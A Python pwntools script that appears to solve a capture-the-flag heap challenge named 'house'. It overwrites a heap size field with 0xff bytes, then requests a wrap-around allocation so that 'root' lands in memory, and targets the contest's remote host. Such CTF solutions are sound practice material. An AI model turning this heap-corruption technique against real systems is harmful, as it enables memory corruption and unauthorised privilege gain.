from pwn import *

# Set up pwntools for the correct architecture
exe = "./house"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

# r = start()
r = remote("house.nc.jctf.pro", 1337)

sl(b"1")
sl(b"A"*0x18 + b"\xff"*8)
space = (0xffffffffffffffd9 - 0x6032e0) + (0x603250)
sl(b"B"*0x10 + b"root")
ru(b"Enter disk space: \n")
sl(str(space).encode())

sl(b"2")

r.interactive()